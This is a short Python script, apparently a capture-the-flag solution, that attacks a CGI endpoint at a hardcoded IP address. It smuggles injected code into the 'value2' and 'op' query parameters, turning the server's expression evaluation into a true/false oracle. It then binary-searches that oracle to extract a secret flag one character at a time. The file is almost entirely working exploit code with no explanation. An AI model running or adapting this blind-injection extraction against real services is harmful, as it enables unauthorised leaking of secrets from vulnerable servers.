#!/usr/bin/env python

import requests

url = 'http://178.128.96.203/cgi-bin/server.py?'
flag = ''
v1 = 'a'
v2 = '+FLAG<value1+source#'
op = "+'"

def check(s):
	s = chr(s)
	source = flag + s
	param = dict(source=source, value1=v1, value2=v2, op=op)
	r = requests.get(url, params=param)
	return 'True' in r.text

def bin_search(seq = range(0x20, 0x80), low = 0, high = 96):
	while low < high:
		mid = (low + high) / 2
		if check(seq[mid]):
			high = mid
		else:
			low = mid + 1
	return chr(seq[low] - 1)

while 1:
	flag += bin_search()
	print flag